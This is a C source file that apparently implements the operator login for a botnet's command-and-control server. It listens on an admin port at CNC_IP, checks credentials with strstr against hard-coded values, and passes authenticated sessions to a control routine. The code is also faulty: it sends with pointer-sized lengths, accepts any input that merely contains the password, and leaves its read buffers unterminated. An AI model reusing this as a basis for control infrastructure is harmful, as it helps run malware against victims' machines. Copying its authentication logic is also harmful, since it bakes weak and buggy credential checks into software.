#include "../../includes/config/config.h"
#include "../../includes/io/login.h"
#include "../server/server.c"
#include "io.c"
#pragma once


/*
    *    util/io/login.c
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


void login(void) {
    int sock_fd, conn_fd;
    char login_buf[1000];
    char pass_buf[1000];
    
    char *login_message = "Login: ";
    char *password_message = "Password: ";
    char *good_login_message = "Sucessfully Authenticated!\n";
    char *bad_login_message = "Invalid credentials!\n";
    
    pthread_t cnc;
    struct sockaddr_in sock;    
    
    sock.sin_family = AF_INET;
    sock.sin_port = htons(ADMIN_PORT);
    sock.sin_addr.s_addr = inet_addr(CNC_IP);

    sock_fd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sock_fd, (struct sockaddr *)&sock, sizeof(sock));
    listen(sock_fd, 128);

    conn_fd = accept(sock_fd, NULL, NULL);
    display_banner(conn_fd);
    
    send(conn_fd, login_message, strlen(login_message), 0);
    read(conn_fd, login_buf, sizeof(login_buf));
        
    send(conn_fd, password_message, strlen(password_message), 0);
    read(conn_fd, pass_buf, sizeof(pass_buf));

    if (strstr(login_buf, USERNAME) != NULL) {
        if (strstr(pass_buf, PASSWORD) != NULL) {
            send(conn_fd, good_login_message, sizeof(good_login_message), 0);
            c_server(conn_fd);
        } else {
            send(conn_fd, bad_login_message, sizeof(bad_login_message), 0);
        }
    } else {
        send(conn_fd, bad_login_message, sizeof(bad_login_message), 0);
    }
    close(sock_fd);
}